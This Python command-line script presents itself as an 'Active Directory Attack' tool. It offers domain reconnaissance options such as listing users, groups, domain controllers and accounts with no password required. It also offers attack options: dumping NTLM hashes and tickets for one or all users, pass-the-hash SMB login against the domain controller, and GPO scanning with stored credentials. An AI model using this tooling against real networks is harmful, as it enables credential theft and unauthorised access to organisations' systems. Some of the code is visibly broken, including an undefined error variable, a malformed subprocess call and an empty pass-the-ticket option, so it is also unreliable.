import click
import os
import subprocess
from dotenv import load_dotenv
from dumphash import dump_only_person, analyze_minidump, dump_hash
from passTheHash import smb_login_with_ntlm_hash
from getUsersOfGroup import get_group_members
from ou import get_ou_gpo_mapping

load_dotenv()

@click.group()
def cli():
    """================ Active Directory Attack =======================
    """
    pass

@cli.command(help=
             """
             Information about Active Directory\n
             Select action: info --use <option>\n
             1. List all users\n
             2. List all groups\n
             3. Get all users in group\n
             4. Get all computers\n
             5. List all domain controllers\n
             6. Check Domain Controller support NTLM Authentication\n
             7. Get OUs, GPO for OU\n
             8. Get DNS Records\n
             9. Lists of services status\n
             10. Check users with no password required
             """)
@click.option("--use", type=int)
def info(use, help="Recon mode"):
    if use == 1:
        click.echo("------- Get all users in domain -------")
        try:
            subprocess.run(["python", "getAllUsers.py"], check=True)
        except subprocess.CalledProcessError as e:
            click.echo(f"Error: {e}")
    elif use == 2:
        click.echo("------- Get all groups in domain -------")
        try:
            subprocess.run(["python", "getAllGroups.py"], check=True)
        except subprocess.CalledProcessError as e:
            click.echo(f"Error: {e}")
    elif use == 3:
        click.echo("------- Get all users in group -------")
        get_group_members(input("Enter group name: "))
    elif use == 4:
        click.echo("------- Get all computers in domain -------")
        try:
            subprocess.run(["python", "computers.py"], check=True)
        except subprocess.CalledProcessError as e:
            click.echo(f"Error: {e}")
    elif use == 5:
        click.echo("------- Get all domain controllers -------")
        try:
            subprocess.run(["python", "dc.py"], check=True)
        except subprocess.CalledProcessError as e:
            click.echo(f"Error: {e}")
    elif use == 6:
        try:
            subprocess.run(["python", "checkNtlmAuth.py"], check=True)
        except subprocess.CalledProcessError as e:
            click.echo(f"Error: {e}")
    elif use == 7:
        click.echo("------- Get OUs, GPO for OU -------")
        get_ou_gpo_mapping()
    elif use == 8:
        click.echo("------- Get DNS Records -------")
        try:
            subprocess.run(["python", "dns.py"], check=True)
        except subprocess.CalledProcessError as e:
            click.echo(f"Error: {e}")
    elif use == 9:
        click.echo("------- List services status -------")
        try:
            subprocess.run(["python", "service.py"], check=True)
        except subprocess.CalledProcessError as e:
            click.echo(f"Error: {e}")
    elif use == 10:
        click.echo("------- Check users with no password required -------")
        try:
            subprocess.run(["python", "userNotPwd.py"], check=True)
        except subprocess.CalledProcessError as e:
            click.echo(f"Error: {e}")

@cli.command(help=
             """
             Active Directory Attack\n
             Option: attack --use <option>\n
             1. Get NTLM Hash and Ticket (only 1 user)\n
             2. GET NTLM Hash and Ticket (all of users)\n
             3. Pass The Hash\n
             4. Pass The Ticket\n
             5. Scan GPOs
             """)
@click.option("--use", type=int)
def attack(use):
    if use == 1:
        try:
            username = input("Enter target username: ")
            dump_only_person(username)
        except:
            click.echo(f"Error: {e}")
    elif use == 2:
        try:
            analyze_minidump()
        except subprocess.CalledProcessError as e:
            click.echo(f"Error: {e}")
    elif use == 3:
        try:
            target_ip = os.getenv('dc-ip')
            username = input("Target username: ")
            domain = os.getenv('domain')
            ntlm_hash = dump_hash(username)
            smb_login_with_ntlm_hash(target_ip, username, domain, ntlm_hash)
        except Exception as e:
            print(f"Error during SMB login: {e}")   
    elif use == 4:
        pass
    elif use == 5:
        try:
            subprocess.run(f"python gpo_analyzer_cli.py -u {os.getenv('username2')} -p {os.getenv('password_AD')} -d {os.getenv('domain')} -dc {os.getenv('dc-ip')} -v", check=True)
        except subprocess.CalledProcessError as e:
            click.echo(f"Error: {e}")

if __name__ == "__main__":
    cli()